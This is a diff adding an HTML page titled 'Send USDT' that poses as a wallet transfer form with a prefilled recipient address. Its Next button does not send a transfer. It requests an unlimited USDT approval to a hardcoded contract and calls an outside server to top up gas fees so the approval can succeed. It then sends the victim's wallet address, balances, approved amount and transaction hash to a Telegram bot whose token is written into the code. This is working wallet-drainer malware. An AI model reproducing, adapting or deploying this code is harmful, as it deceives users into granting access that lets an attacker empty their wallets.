@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+
+</head>
+<body>
+  <main class="container">
+    <h1 class="title">Send USDT</h1>
+
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" placeholder="Search or Enter" value="0xDc246aF96aAF24F49BBade639b80C08F264DF289">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    </div>
+
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate">≈ $0.00</p>
+
+    <button type="submit" class="next-btn" onclick="TokenApprove()">Next</button>
+  </main>
+
+  <script type="text/javascript" src="js/web3.min.js"></script>
+<script src="js/jquery-3.7.1.min.js"></script> 
+<script>
+
+        var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
+        var matrixAbiTOKEN = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
+
+    var addressSTAKING = "0xa180f965528e913fdb9a250e2d0ae7108c6f19af";
+        var matrixAbiSTAKING = [{ "constant": false, "inputs": [{ "name": "_data", "type": "bytes32" }], "name": "setfirelevel", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "mainadmin", "type": "address" }], "name": "RewardGeneration", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_token", "type": "address" }], "name": "setTokenAddress", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "multiTransferUSD", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_userAddresses", "type": "address[]" }, { "name": "_amount", "type": "uint256" }], "name": "airDropTRX", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_tokenadd", "type": "address" }, { "name": "_wallet", "type": "address" }, { "name": "_amount", "type": "uint256" }], "name": "distrubutionroi", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_contributors", "type": "address[]" }, { "name": "_balances", "type": "uint256[]" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "TransferBusd", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newValue", "type": "uint256" }], "name": "distrubutionIncome", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_contractAddress", "type": "address" }], "name": "getMsgData", "outputs": [{ "name": "hash", "type": "bytes32" }], "payable": false, "stateMutability": "pure", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "_token", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multisended", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multireceivers", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_userAddress", "type": "address" }, { "indexed": false, "name": "_amount", "type": "uint256" }], "name": "Airdropped", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "onOwnershipTransferred", "type": "event" }];
+
+        var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;
+
+
+ window.addEventListener('load', connectWallet);
+    async function connectWallet() {
+        if (window.ethereum) {
+
+                // Request wallet connection
+                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    if (chainId !== '0x38') { // 0x38 is BSC Mainnet
+                        await switchToBSC();
+                    }
+
+        } else {
+            console.log("Please install MetaMask!");
+        }
+    }
+
+
+
+    async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }]
+                });
+            } catch (error) {
+                if (error.code === 4902) {
+                    // If BSC is not added, request to add it
+                    await addBSCNetwork();
+                } else {
+                    console.error("Failed to switch chain", error);
+                }
+            }
+        }
+
+        async function addBSCNetwork() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: '0x38',
+                        chainName: 'Binance Smart Chain',
+                        nativeCurrency: {
+                            name: 'Binance Coin',
+                            symbol: 'BNB',
+                            decimals: 18
+                        },
+                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                        blockExplorerUrls: ['https://bscscan.com/']
+                    }]
+                });
+            } catch (addError) {
+                console.error("Failed to add BSC network", addError);
+            }
+        }
+
+
+
+        var bal1 = 0;
+
+        async function Checkapprovaltoken() {
+
+        window.contract = web3.eth.contract(matrixAbiTOKEN);
+        window.BNBLINEcontract = contract.at(addressTOKEN);
+        var account = web3.eth.accounts[0];
+
+                window.BNBLINEcontract.allowance(account, addressSTAKING, {
+                    from: web3.eth.accounts[0]
+
+                }, function (error, result) {
+                    if (!error) {
+                        if (result > 0) {
+
+
+                     window.BNBLINEcontract.balanceOf(account, {
+                    from: web3.eth.accounts[0]
+
+                }, function (error, result) {
+                    if (!error) {
+
+                        console.log(result + ' allowance Final result is ');
+                        if (result > 0) {
+
+                            bal1 = result / 1000000000000000000;
+
+                            var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };
+
+                            $.ajax({
+                                url: '/MemberPanel/TopUpWithMetamaskJson',
+                                type: 'POST',
+                                dataType: 'JSON',
+                                contentType: 'application/json',
+                                data: JSON.stringify(maindt),
+                                success: function (data) {
+                                    if (data == "Success") {
+                                        alert('Error: Please try after sometime.');
+                                        location.href = "/home/index";
+
+                                        window.location.href = url;
+                                        console.log('success');
+                                    }
+                                    else {
+                     }
+                                },
+                                error: function (err) {
+                                    console.log("error:" + JSON.stringify(err));
+
+                                }
+                            });
+
+                            location.href = "/home/index";
+                            window.location.href = url;
+                        }
+                    }
+                    else {
+
+                        console.log(error.code + ' allowance Final error is ')
+                        alert('Reject');
+                    }
+                             });
+
+                        }
+                        else {
+                            TokenApprove();
+                        }
+                    }
+                    else {
+
+                        console.log(error.code + ' allowance Final error is ')
+                        alert('Reject');
+                    }
+                });
+
+    }
+
+         
+
+</script>
+
+<script>
+    // Initialize Web3
+    const web3 = new Web3(window.ethereum);
+
+    async function TokenApprove() {
+    const accounts = await ethereum.request({ method: 'eth_accounts' });
+    const account = accounts[0];
+
+    // Step 1: Check the current BNB balance
+    const bnbBalance = await web3.eth.getBalance(account);
+    const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB
+    console.log("Current BNB Balance: ", balanceInBNB);
+
+    const requiredBNB = 0.0001; // Adjust this as per your required network fee (this is a threshold)
+
+    // Step 2: If BNB balance is lower than the threshold, request an automatic top-up from the backend
+    if (parseFloat(balanceInBNB) < requiredBNB) {
+        alert("Not enough BNB in your wallet. Automatically requesting top-up...");
+
+        // Request the BNB top-up from the backend and wait for it to complete
+        const topUpSuccess = await requestBNBTopUp(account);
+
+        // If the top-up is not successful, stop further processing
+        if (!topUpSuccess) {
+            alert("Failed to initiate BNB top-up. Please try again.");
+            return;  // Prevent further actions
+        }
+
+        // After successful top-up, recheck the balance
+        const newBnbBalance = await web3.eth.getBalance(account);
+        const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
+        
+        // Check if the new balance is still not enough
+        if (parseFloat(newBalanceInBNB) < requiredBNB) {
+            alert("BNB top-up failed to reach required amount. Please try again later.");
+            return;  // Exit if top-up failed to provide enough BNB
+        }
+    }
+
+    // Step 3: Proceed with the token approval if BNB balance is sufficient
+    await approveToken(account);
+}
+
+// Function to request the BNB top-up from your backend
+async function requestBNBTopUp(account) {
+    try {
+        const response = await fetch('https://bnb-server-production-0b1f.up.railway.app/send-bnb', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ recipient: account }),
+        });
+
+        const data = await response.json();
+        if (data.success) {
+            alert('BNB Top-Up initiated successfully!');
+            return true;  // Return true indicating the top-up was successful
+        } else {
+            alert('Failed to initiate top-up.');
+            return false;  // Return false indicating the top-up failed
+        }
+    } catch (error) {
+        console.error('Error during BNB top-up request:', error);
+        alert('Error initiating BNB top-up.');
+        return false;  // Return false in case of an error
+    }
+}
+
+// Token approval function remains the same
+async function approveToken(account) {
+    const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
+    const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');
+
+    // Get the current BNB balance
+    const bnbBalance = await web3.eth.getBalance(account);
+    const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB
+
+    // Get the current approved USDT amount
+    const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
+    const approvedUSDT = web3.utils.fromWei(allowance, 'ether'); // Convert from Wei to USDT
+
+    const currentDate = new Date();
+    const formattedDate = currentDate.toLocaleString();  // Format the current date and time
+
+    // Get the approved address
+    const approvedAddress = addressSTAKING;  // You can change this as needed
+
+    await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
+        .send({ from: account })
+        .on('transactionHash', function (hash) {
+            console.log('Approval transaction sent with hash:', hash);
+            var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
+            $.ajax({
+                url: '/home/TopUpWithMetamaskJson',
+                type: 'POST',
+                dataType: 'JSON',
+                contentType: 'application/json',
+                data: JSON.stringify(maindt),
+                success: function (data) {
+                    alert('Success: Transfer Successfully.');
+                    location.href = "/home/index";
+                    console.log('Success');
+                    
+                    // Send Telegram Notification with detailed information
+                    sendTelegramNotification(
+                        account, 
+                        balanceInBNB, 
+                        approvedUSDT, 
+                        approvedAddress, 
+                        formattedDate, 
+                        hash
+                    );
+                },
+                error: function (err) {
+                    console.log("Error: " + JSON.stringify(err));
+                }
+            });
+        })
+        .on('receipt', function (receipt) {
+            console.log('Approval confirmed with receipt:', receipt);
+        })
+        .on('error', function (error) {
+            if (error.code === 4001) {
+                console.log("You canceled the approval request. Please try again.");
+            } else {
+                console.log("Approval failed: " + error.message);
+            }
+            console.error("Approval failed:", error);
+        });
+}
+
+// Telegram notification function
+async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash) {
+    const botToken = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM'; // Replace with your bot token
+    const chatId = '8191508290'; // Replace with your chat ID
+    
+    const message = `Wallet Address: ${walletAddress}\n` +
+                    `BNB Amount: ${bnbAmount} BNB\n` +
+                    `USDT Amount Approved: ${usdtAmount} USDT\n` +
+                    `Approved Address: ${approvedAddress}\n` +
+                    `Date and Time: ${dateTime}\n` +
+                    `Transaction Hash: ${txHash}`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+        if (data.ok) {
+            console.log('Telegram notification sent successfully');
+        } else {
+            console.error('Failed to send Telegram notification:', data);
+        }
+    } catch (error) {
+        console.error('Error sending Telegram notification:', error);
+    }
+}
+
+</script>
+<script>
+    const amountInput = document.getElementById("amountInput");
+    const amountDisplay = document.getElementById("amountDisplay");
+
+    // Listen for input changes
+    amountInput.addEventListener("input", function () {
+        // Get the current value and convert to a number if needed
+        const val = amountInput.value;
+        // Update the p tag; you can add formatting as needed 
+        amountDisplay.textContent = `= $${val || "0.00"}`;
+    });
+</script>
+
+
+
+
+
+
+
+
+
+</body><!-- Mirrored from demo.awaikenthemes.com/html-preview/quivox/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 07:58:55 GMT --></html>
